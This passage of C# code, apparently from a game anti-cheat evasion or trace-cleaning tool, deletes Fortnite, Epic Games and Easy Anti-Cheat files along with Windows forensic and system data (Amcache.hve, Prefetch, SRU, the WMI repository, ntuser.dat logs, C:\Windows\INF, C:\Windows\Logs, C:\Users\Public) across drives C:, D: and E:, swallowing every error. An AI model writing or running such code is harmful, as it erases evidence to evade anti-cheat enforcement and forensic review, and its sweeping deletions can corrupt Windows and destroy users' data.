				bool flag6 = Directory.Exists("C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive");
				if (flag6)
				{
					Directory.Delete("C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag7 = File.Exists("C:\\Windows\\appcompact\\Programs\\Amcache.hve");
				if (flag7)
				{
					File.Delete("C:\\Windows\\appcompact\\Programs\\Amcache.hve");
				}
			}
			catch
			{
			}
			try
			{
				bool flag8 = File.Exists("C:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
				if (flag8)
				{
					File.Delete("C:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
				}
			}
			catch
			{
			}
			try
			{
				bool flag9 = File.Exists("C:\\Windows\\System\\config\\BBI.LOG2");
				if (flag9)
				{
					File.Delete("C:\\Windows\\System\\config\\BBI.LOG2");
				}
			}
			catch
			{
			}
			bool flag10 = Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngine");
			if (flag10)
			{
				try
				{
					Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngine", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag11 = Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngineLauncher");
			if (flag11)
			{
				try
				{
					Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngineLauncher", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag12 = Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher");
			if (flag12)
			{
				try
				{
					Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag13 = Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame");
			if (flag13)
			{
				try
				{
					Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			try
			{
				bool flag14 = Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\NVIDIA Corporation");
				if (flag14)
				{
					Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\NVIDIA Corporation", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag15 = Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Speech Graphics");
				if (flag15)
				{
					Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Speech Graphics", true);
				}
			}
			catch
			{
			}
			bool flag16 = Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Packages");
			if (flag16)
			{
				try
				{
					Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Packages", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			try
			{
				bool flag17 = File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\AMD\\DxCache");
				if (flag17)
				{
					File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\AMD\\DxCache");
				}
			}
			catch
			{
			}
			try
			{
				bool flag18 = File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
				if (flag18)
				{
					File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
				}
			}
			catch
			{
			}
			try
			{
				bool flag19 = File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
				if (flag19)
				{
					File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
				}
			}
			catch
			{
			}
			bool flag20 = Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent");
			if (flag20)
			{
				try
				{
					Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag21 = Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\Notifications");
			if (flag21)
			{
				try
				{
					Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\Notifications", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			try
			{
				bool flag22 = Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache");
				if (flag22)
				{
					Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag23 = Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Roaming\\EasyAntiCheat");
				if (flag23)
				{
					Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Roaming\\EasyAntiCheat", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag24 = Directory.Exists("C:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore");
				if (flag24)
				{
					Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag25 = File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds");
				if (flag25)
				{
					File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds");
				}
			}
			catch
			{
			}
			try
			{
				bool flag26 = File.Exists("C:\\Program Files\\Epic Games\\Fortnite.lysEB");
				if (flag26)
				{
					File.Delete("C:\\Program Files\\Epic Games\\Fortnite.lysEB");
				}
			}
			catch
			{
			}
			try
			{
				bool flag27 = Directory.Exists("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir");
				if (flag27)
				{
					Directory.Delete("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag28 = File.Exists("C:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
				if (flag28)
				{
					File.Delete("C:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
				}
			}
			catch
			{
			}
			try
			{
				bool flag29 = File.Exists("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
				if (flag29)
				{
					File.Delete("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
				}
			}
			catch
			{
			}
			try
			{
				bool flag30 = File.Exists("C:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
				if (flag30)
				{
					File.Delete("C:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
				}
			}
			catch
			{
			}
			try
			{
				bool flag31 = File.Exists("C:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
				if (flag31)
				{
					File.Delete("C:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
				}
			}
			catch
			{
			}
			try
			{
				bool flag32 = Directory.Exists("C:\\MSOCache");
				if (flag32)
				{
					Directory.Delete("C:\\MSOCache", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag33 = File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
				if (flag33)
				{
					File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
				}
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp\\1CF5.bat");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:Windows\\System32\\spp\\store\\2.0\\data.dat");
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Users\\Public", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngine", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds", true);
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\logUploaderSettings_temp.ini");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\logUploaderSettings.ini");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\desktop.ini");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Users\\" + userName + "\\ntuser.dat.LOG2");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Users\\" + userName + "\\ntuser.dat.LOG1");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Users\\" + userName + "\\ntuser.dat.LOG1");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\settings.dat.LOG2");
			}
			catch
			{
			}
			string[] files = Directory.GetFiles("C:\\Users", "desktop.ini");
			foreach (string path in files)
			{
				File.Delete(path);
			}
			try
			{
				File.Delete("C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Windows\\qwavecache.dat");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Windows\\System32\\wbem\\Performance\\WmiApRpl.ini");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Windows\\System32\\PerfStringBackup.TMP");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Windows\\System32\\PerfStringBackup.INI");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Windows\\System32\\wbem\\Repository\\INDEX.BTR");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Windows\\System32\\wbem\\Repository\\MAPPING2.MAP");
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Windows\\Prefetch", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Windows\\temp\\MpCmdRun.log", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Windows\\Prefetch", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Windows\\System32\\sru", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC", true);
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC");
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCookies", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Windows\\INF", true);
			}
			catch
			{
			}
			try
			{
				File.Delete("C:\\Windows\\INF");
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\NVIDIA Corporation", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Windows\\Logs\\CBS", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Windows\\Logs", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Windows\\SoftwareDistribution\\DataStore\\Logs", true);
			}
			catch
			{
			}
			try
			{
				bool flag34 = File.Exists("D:\\Windows\\System32\\eac_usermode_21537346703536.dll");
				if (flag34)
				{
					File.Delete("D:\\Windows\\System32\\eac_usermode_21537346703536.dll");
				}
			}
			catch
			{
			}
			try
			{
				bool flag35 = Directory.Exists("D:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive");
				if (flag35)
				{
					Directory.Delete("D:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag36 = File.Exists("D:\\Windows\\appcompact\\Programs\\Amcache.hve");
				if (flag36)
				{
					File.Delete("D:\\Windows\\appcompact\\Programs\\Amcache.hve");
				}
			}
			catch
			{
			}
			try
			{
				bool flag37 = File.Exists("D:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
				if (flag37)
				{
					File.Delete("D:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
				}
			}
			catch
			{
			}
			try
			{
				bool flag38 = File.Exists("D:\\Windows\\System\\config\\BBI.LOG2");
				if (flag38)
				{
					File.Delete("D:\\Windows\\System\\config\\BBI.LOG2");
				}
			}
			catch
			{
			}
			bool flag39 = Directory.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngine");
			if (flag39)
			{
				try
				{
					Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngine", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag40 = Directory.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngineLauncher");
			if (flag40)
			{
				try
				{
					Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngineLauncher", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag41 = Directory.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher");
			if (flag41)
			{
				try
				{
					Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag42 = Directory.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame");
			if (flag42)
			{
				try
				{
					Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			try
			{
				bool flag43 = Directory.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\NVIDIA Corporation");
				if (flag43)
				{
					Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\NVIDIA Corporation", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag44 = Directory.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\Speech Graphics");
				if (flag44)
				{
					Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Speech Graphics", true);
				}
			}
			catch
			{
			}
			bool flag45 = Directory.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\Packages");
			if (flag45)
			{
				try
				{
					Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Packages", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			try
			{
				bool flag46 = File.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\AMD\\DxCache");
				if (flag46)
				{
					File.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\AMD\\DxCache");
				}
			}
			catch
			{
			}
			try
			{
				bool flag47 = File.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
				if (flag47)
				{
					File.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
				}
			}
			catch
			{
			}
			try
			{
				bool flag48 = File.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
				if (flag48)
				{
					File.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
				}
			}
			catch
			{
			}
			bool flag49 = Directory.Exists("D:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent");
			if (flag49)
			{
				try
				{
					Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag50 = Directory.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\Notifications");
			if (flag50)
			{
				try
				{
					Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\Notifications", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			try
			{
				bool flag51 = Directory.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache");
				if (flag51)
				{
					Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag52 = Directory.Exists("D:\\Users\\" + userName + "\\AppData\\Roaming\\EasyAntiCheat");
				if (flag52)
				{
					Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Roaming\\EasyAntiCheat", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag53 = Directory.Exists("D:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore");
				if (flag53)
				{
					Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag54 = File.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds");
				if (flag54)
				{
					File.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds");
				}
			}
			catch
			{
			}
			try
			{
				bool flag55 = File.Exists("D:\\Program Files\\Epic Games\\Fortnite.lysEB");
				if (flag55)
				{
					File.Delete("D:\\Program Files\\Epic Games\\Fortnite.lysEB");
				}
			}
			catch
			{
			}
			try
			{
				bool flag56 = Directory.Exists("D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir");
				if (flag56)
				{
					Directory.Delete("D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag57 = File.Exists("D:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
				if (flag57)
				{
					File.Delete("D:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
				}
			}
			catch
			{
			}
			try
			{
				bool flag58 = File.Exists("D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
				if (flag58)
				{
					File.Delete("D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
				}
			}
			catch
			{
			}
			try
			{
				bool flag59 = File.Exists("D:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
				if (flag59)
				{
					File.Delete("D:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
				}
			}
			catch
			{
			}
			try
			{
				bool flag60 = File.Exists("D:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
				if (flag60)
				{
					File.Delete("D:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
				}
			}
			catch
			{
			}
			try
			{
				bool flag61 = Directory.Exists("D:\\MSOCache");
				if (flag61)
				{
					Directory.Delete("D:\\MSOCache", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag62 = File.Exists("D:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
				if (flag62)
				{
					File.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
				}
			}
			catch
			{
			}
			try
			{
				File.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp");
			}
			catch
			{
			}
			try
			{
				File.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp\\1CF5.bat");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:Windows\\System32\\spp\\store\\2.0\\data.dat");
			}
			catch
			{
			}
			try
			{
				Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Origin", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Origin", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("D:\\Users\\Public", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds", true);
			}
			catch
			{
			}
			try
			{
				File.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds");
			}
			catch
			{
			}
			try
			{
				File.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF244a582.TMP");
			}
			catch
			{
			}
			try
			{
				Directory.Delete("D:\\Windows\\temp\\w1053", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("D:\\Windows\\temp\\MpCmdRun.log", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("D:\\Windows\\Prefetch", true);
			}
			catch
			{
			}
			try
			{
				bool flag63 = File.Exists("E:\\Windows\\System32\\eac_usermode_21537346703536.dll");
				if (flag63)
				{
					File.Delete("E:\\Windows\\System32\\eac_usermode_21537346703536.dll");
				}
			}
			catch
			{
			}
			try
			{
				bool flag64 = Directory.Exists("E:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive");
				if (flag64)
				{
					Directory.Delete("E:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag65 = File.Exists("E:\\Windows\\appcompact\\Programs\\Amcache.hve");
				if (flag65)
				{
					File.Delete("E:\\Windows\\appcompact\\Programs\\Amcache.hve");
				}
			}
			catch
			{
			}
			try
			{
				bool flag66 = File.Exists("E:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
				if (flag66)
				{
					File.Delete("E:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
				}
			}
			catch
			{
			}
			try
			{
				bool flag67 = File.Exists("E:\\Windows\\System\\config\\BBI.LOG2");
				if (flag67)
				{
					File.Delete("E:\\Windows\\System\\config\\BBI.LOG2");
				}
			}
			catch
			{
			}
			bool flag68 = Directory.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngine");
			if (flag68)
			{
				try
				{
					Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngine", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag69 = Directory.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngineLauncher");
			if (flag69)
			{
				try
				{
					Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngineLauncher", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag70 = Directory.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher");
			if (flag70)
			{
				try
				{
					Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag71 = Directory.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame");
			if (flag71)
			{
				try
				{
					Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			try
			{
				bool flag72 = Directory.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\NVIDIA Corporation");
				if (flag72)
				{
					Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\NVIDIA Corporation", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag73 = Directory.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\Speech Graphics");
				if (flag73)
				{
					Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Speech Graphics", true);
				}
			}
			catch
			{
			}
			bool flag74 = Directory.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\Packages");
			if (flag74)
			{
				try
				{
					Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Packages", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			try
			{
				bool flag75 = File.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\AMD\\DxCache");
				if (flag75)
				{
					File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\AMD\\DxCache");
				}
			}
			catch
			{
			}
			try
			{
				bool flag76 = File.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
				if (flag76)
				{
					File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
				}
			}
			catch
			{
			}
			try
			{
				bool flag77 = File.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
				if (flag77)
				{
					File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
				}
			}
			catch
			{
			}
			bool flag78 = Directory.Exists("E:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent");
			if (flag78)
			{
				try
				{
					Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag79 = Directory.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\Notifications");
			if (flag79)
			{
				try
				{
					Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\Notifications", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			try
			{
				bool flag80 = Directory.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache");
				if (flag80)
				{
					Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag81 = Directory.Exists("E:\\Users\\" + userName + "\\AppData\\Roaming\\EasyAntiCheat");
				if (flag81)
				{
					Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Roaming\\EasyAntiCheat", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag82 = Directory.Exists("E:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore");
				if (flag82)
				{
					Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag83 = File.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds");
				if (flag83)
				{
					File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds");
				}
			}
			catch
			{
			}
			try
			{
				bool flag84 = File.Exists("E:\\Program Files\\Epic Games\\Fortnite.lysEB");
				if (flag84)
				{
